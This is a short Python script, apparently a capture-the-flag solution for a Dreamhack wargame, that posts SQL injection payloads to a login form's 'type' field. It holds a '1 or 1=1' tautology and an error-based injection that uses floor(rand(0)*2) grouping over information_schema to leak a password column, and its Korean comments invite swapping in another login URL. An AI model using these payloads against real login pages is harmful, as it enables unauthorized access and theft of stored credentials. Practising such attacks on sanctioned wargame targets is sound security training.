import requests

url = 'http://host3.dreamhack.games:15069/login_ok.php'  # 로그인 페이지의 URL로 변경해야 합니다.

payload2 = '1 or row(1,1)>(select count(*),concat(ps,0x41,floor(rand(0)*2)) as test from information_schema.tables group by test limit 1)'
payload = '1 or 1=1'
data = {'id': '59.9.83.195',
        'pw': '1234',
        'type': payload}  # 적절한 값으로 변경해야 합니다.

response = requests.post(url, data=data)

print(response.text)
